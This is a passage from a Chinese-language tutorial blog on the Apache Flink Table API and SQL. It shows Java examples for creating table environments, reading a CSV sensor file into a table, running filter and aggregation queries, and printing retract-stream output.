class="line"><span class="comment">// 创建一张表，用于读取数据</span></span><br><span class="line">tableEnv.connect(...).createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册一张表，用于把计算结果输出</span></span><br><span class="line">tableEnv.connect(...).createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 Table API 查询算子，得到一张结果表</span></span><br><span class="line">Table result = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>).select(...);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过SQL查询语句，得到一张结果表</span></span><br><span class="line">Table sqlResult = tableEnv.sqlQuery(<span class="string">&quot;SELECT ... FROM inputTable ...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果表写入输出表中</span></span><br><span class="line">result.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="Table-API批处理和流处理"><a href="#Table-API批处理和流处理" class="headerlink" title="Table API批处理和流处理"></a>Table API批处理和流处理</h4><p>新版本blink，真正把批处理、流处理都以DataStream实现。</p><h5 id="创建环境-样例代码"><a href="#创建环境-样例代码" class="headerlink" title="创建环境-样例代码"></a>创建环境-样例代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.ExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.EnvironmentSettings;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.TableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.BatchTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.internal.TableEnvironmentImpl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.1 基于老版本planner的流处理</span></span><br><span class="line">    EnvironmentSettings oldStreamSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useOldPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment oldStreamTableEnv = StreamTableEnvironment.create(env,oldStreamSettings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.2 基于老版本planner的批处理</span></span><br><span class="line">    ExecutionEnvironment batchEnv = ExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    BatchTableEnvironment oldBatchTableEnv = BatchTableEnvironment.create(batchEnv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.3 基于Blink的流处理</span></span><br><span class="line">    EnvironmentSettings blinkStreamSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment blinkStreamTableEnv = StreamTableEnvironment.create(env,blinkStreamSettings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.4 基于Blink的批处理</span></span><br><span class="line">    EnvironmentSettings blinkBatchSettings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inBatchMode()</span><br><span class="line">      .build();</span><br><span class="line">    TableEnvironment blinkBatchTableEnv = TableEnvironment.create(blinkBatchSettings);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="表-Table"><a href="#表-Table" class="headerlink" title="表(Table)"></a>表(Table)</h5><ul><li>TableEnvironment可以注册目录Catalog，并可以基于Catalog注册表</li><li><strong>表(Table)是由一个”标示符”(identifier)来指定的，由3部分组成：Catalog名、数据库(database)名和对象名</strong></li><li>表可以是常规的，也可以是虚拟的(视图，View)</li><li>常规表(Table)一般可以用来描述外部数据，比如文件、数据库表或消息队列的数据，也可以直接从DataStream转换而来</li><li>视图(View)可以从现有的表中创建，通常是table API或者SQL查询的一个结果集</li></ul><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><ul><li> TableEnvironment可以调用<code>connect()</code>方法，连接外部系统，并调用<code>.createTemporaryTable()</code>方法，在Catalog中注册表  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tableEnv</span><br><span class="line">  .connect(...)<span class="comment">//定义表的数据来源，和外部系统建立连接</span></span><br><span class="line">  .withFormat(...)<span class="comment">//定义数据格式化方法</span></span><br><span class="line">  .withSchema(...)<span class="comment">//定义表结构</span></span><br><span class="line">  .createTemporaryTable(<span class="string">&quot;MyTable&quot;</span>);<span class="comment">//创建临时表</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="创建TableEnvironment"><a href="#创建TableEnvironment" class="headerlink" title="创建TableEnvironment"></a>创建TableEnvironment</h5><ul><li> 创建表的执行环境，需要将flink流处理的执行环境传入<br><code>StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</code> </li><li>TableEnvironment是flink中集成Table API和SQL的核心概念，所有对表的操作都基于TableEnvironment <ul><li>注册Catalog</li><li>在Catalog中注册表</li><li>执行SQL查询</li><li>注册用户自定义函数（UDF）</li></ul></li></ul><h6 id="测试代码-6"><a href="#测试代码-6" class="headerlink" title="测试代码"></a>测试代码</h6><ul><li><p> pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Table API 和 Flink SQL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-planner-blink_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- csv --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-csv<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 表的创建：连接外部系统，读取数据</span></span><br><span class="line">    <span class="comment">// 2.1 读取文件</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath)) <span class="comment">// 定义到文件系统的连接</span></span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv()) <span class="comment">// 定义以csv格式进行数据格式化</span></span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 ) <span class="comment">// 定义表结构</span></span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>); <span class="comment">// 创建临时表</span></span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    inputTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(inputTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输入文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- timestamp: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> </span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li></ul><h5 id="表的查询"><a href="#表的查询" class="headerlink" title="表的查询"></a>表的查询</h5><ul><li> Table API是集成在Scala和Java语言内的查询API </li><li> Table API基于代表”表”的Table类，并提供一整套操作处理的方法API；这些方法会返回一个新的Table对象，表示对输入表应用转换操作的结果 </li><li> 有些关系型转换操作，可以由多个方法调用组成，构成链式调用结构  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Table sensorTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">Table resultTable = sensorTable</span><br><span class="line">  .select(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;temperature&quot;</span>)</span><br><span class="line">  .filter(<span class="string">&quot;id = &#x27;sensor_1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h6 id="从文件获取数据"><a href="#从文件获取数据" class="headerlink" title="从文件获取数据"></a>从文件获取数据</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 3:56 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest2_CommonApi</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 表的创建：连接外部系统，读取数据</span></span><br><span class="line">    <span class="comment">// 2.1 读取文件</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    <span class="comment">//        inputTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(inputTable, Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 查询转换</span></span><br><span class="line">    <span class="comment">// 3.1 Table API</span></span><br><span class="line">    <span class="comment">// 简单转换</span></span><br><span class="line">    Table resultTable = inputTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 聚合统计</span></span><br><span class="line">    Table aggTable = inputTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 SQL</span></span><br><span class="line">    tableEnv.sqlQuery(<span class="string">&quot;select id, temp from inputTable where id = &#x27;senosr_6&#x27;&quot;</span>);</span><br><span class="line">    Table sqlAggTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp from inputTable group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(aggTable, Row.class).print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(sqlAggTable, Row.class).print(<span class="string">&quot;sqlagg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出结果<br><em>里面的false表示上一条保存的记录被删除，true则是新加入的数据</em><br><em>所以Flink的Table API在更新数据时，实际是先删除原本的数据，再添加新数据。</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,15.4</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,1,15.4)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,1,6.7)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,1,38.1)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,1,15.4)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,1,6.7)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,1,38.1)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">sqlagg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,4,35.5)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,1,35.8)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,2,36.05)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,4,35.5)</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="数据写入到文件"><a href="#数据写入到文件" class="headerlink" title="数据写入到文件"></a>数据写入到文件</h6><blockquote><p><a href="https://blog.csdn.net/qq_26502245/article/details/107376528">flink Sql 1.11 executeSql报No operators defined in streaming topology. Cannot generate StreamGraph.</a></p></blockquote><pre><code>写入到文件有局限，只能是批处理，且只能是追加写，不能是更新式的随机写。</code></pre><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 5:53 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest3_FileOutput</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span 